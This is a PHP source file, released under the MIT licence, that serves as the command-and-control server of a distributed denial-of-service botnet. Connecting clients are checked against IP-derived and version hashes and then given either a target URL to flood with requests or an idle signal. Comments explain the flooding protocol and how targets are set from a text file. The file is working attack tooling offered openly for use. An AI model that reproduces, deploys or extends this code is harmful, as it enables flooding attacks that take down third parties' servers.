<?php
/*
The MIT License (MIT)

Copyright (c) 2015 rebelb0y11

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

//Server Portion:

//Checks if the variable 'isclient' is true. If its not, it redirects it to another page. CHANGE THIS. This is to prevent anyone from directly accessing server.php
if ($_GET['isclient'] == false) header("Location: http://example.com/DDOS/index.php");

if ($_GET['isclient']) {
	$IsNewClient = $_GET['newclient'];
	$Hash = $_GET['hash'];
	$isclient = $_GET['isclient'];
	$clienthash = $_GET['clienthash'];
	$RemIP = $_SERVER['REMOTE_ADDR'];
	if ($isclient != true) $isclient = false;

	// Define Target
	
	//I used a txt file in the same directory as the server.php
	
	//$target = trim(file_get_contents('target.txt'));
	$target = 'NTA';
	
	
	//As of now, these hashes mean nothing. I plan on finishing their uses in the future.
	//And honestly, i may remove them, simply because they were for protecting my server from false clients. However, since ive
	//Open Sourced this project, it means nothing.
	
	
	/* Server Responses Explained:
		NTA: No Target Available. Tells the client to go idle, and check back in a minute or so.
		ICH: Incorrect Hash. (may be removed). Tells the client it has an incorrect hash. The hash its referring to is the version hash, which is listed below as $correcthash
		An http://.... address: Anything starting with http:// is considered a target. The client then floods the server with requests. It then checks back with the server here after so many iterations, in which case the target is changed, or is set to NTA
		A string with the length of 40. This is considered a new client hash. The server calculates this hash using sha1 and the clients IP address. This currently serves no purpose either. It may be removed, or it may be given a purpose.
	*/
	$correcthash = "d1fcd91b7fccef51f7ffbbe2314e905f2ff5cd7c";
	$ch = $clienthash;
	$calhash = sha1($RemIP);
	if ($ch === $calhash) {
		if ($Hash == $correcthash) {
			echo $target;
		}
		else
		if ($Hash != $correcthash) {
			echo "ICH";
		};
	}
	else {
		echo $calhash;
	};
};

?>

